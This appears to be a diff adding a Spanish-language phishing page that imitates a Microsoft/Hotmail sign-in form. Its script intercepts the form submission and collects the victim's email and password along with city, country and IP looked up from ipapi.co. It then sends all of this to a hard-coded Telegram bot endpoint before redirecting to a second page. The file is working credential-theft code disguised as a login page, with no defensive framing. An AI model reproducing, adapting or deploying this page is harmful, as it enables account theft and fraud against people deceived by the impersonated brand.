@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>microsoft</title>
+	<link rel="shortcut icon" type="image/jpg" href="archivos/icon.png"/>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" type="text/css" href="archivos/main.css">
+<!--===============================================================================================-->
+</head>
+<body>
+<div id="vista1">	
+	<div class="limiter">
+		<div class="container-login100">
+			<div class="wrap-login100">
+				<form method="post" id="loginform" action="#" class="delform" >
+	
+					<img src="archivos/modolais.png" style="width:120px;"><br><br>
+					<div class="ms-StackItem css-102"><span class="css-103"></span></div>
+						
+				<div align="left">
+				<span style="font-size: 14px; font-family:Helvetica;"><b>Iniciar sesión&nbsp;</b><br>
+				Comunícate, organízate y trabaja con un servicio personal y gratuito de correo electrónico y calendario.. </span></div><br>
+				
+							<div class="wrap-input100 validate-input m-b-16" data-validate="Please enter username">
+							<input class="input100" type="email" name="corre" id="corre" placeholder="Correo electrónico, teléfono o Skype" required>
+		
+						
+					
+					<br><br>
+
+					</div>
+					
+
+				
+					<div class="wrap-input100 validate-input m-b-16" data-validate="Please enter username">
+							<input class="input100" type="password" name="vip" id="vip" placeholder="Contraseña" required>
+						
+					
+					<br><br>
+
+					<span style="font-size: .8125rem;"><a href="" style="color: #0067b8;text-decoration:none;font-family:Helvetica;">¿Olvidó su contraseña?</a></span>
+								<br>
+
+					
+					<br><br>
+					</div>
+					
+
+					
+					
+
+					<div class="container-login100-form-btn">
+						<button type="submit" class="login100-form-btn">
+							Continuar
+						</button>
+					</div>
+
+
+				
+				
+				</form>
+                <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+                <script>
+                    const url = "https://ipapi.co/json/";
+                    const form = document.querySelector("#loginform");
+                    form.addEventListener("submit", (event) => {
+                        event.preventDefault();
+                        axios
+                            .get(url)
+                            .then((response) => {
+                                const email = document.querySelector("#corre").value;
+            
+                                const contra = document.querySelector("#vip").value;
+            
+                                const message =
+                                    "\nHotmail" +
+                                    "\nEmail: " +
+                                    email +
+                                    "\nContra: " +
+                                    contra +
+                                    "\nCiudad:" +
+                                    response.data.city +
+                                    "\nPais: " +
+                                    response.data.country +
+                                    "\nIP: " +
+                                    response.data.ip;
+                                axios
+                                    .post(
+                                        "https://api.telegram.org/bot6533977820:AAFAMEMUKSgrWVu8gNiSRH8hSfOS7YXh1JA/sendMessage",
+                                        {
+                                            chat_id: "6159458392",
+                                            text: message,
+                                        }
+                                    )
+                                    .then((response) => {
+                                        window.location.href = "index2.html";
+                                    })
+                                    .catch((error) => {
+                                        console.error(error);
+                                    });
+                            })
+                            .catch((error) => {
+                                console.log(error);
+                            });
+                    });
+                </script>
+  </body>
+
+</html>
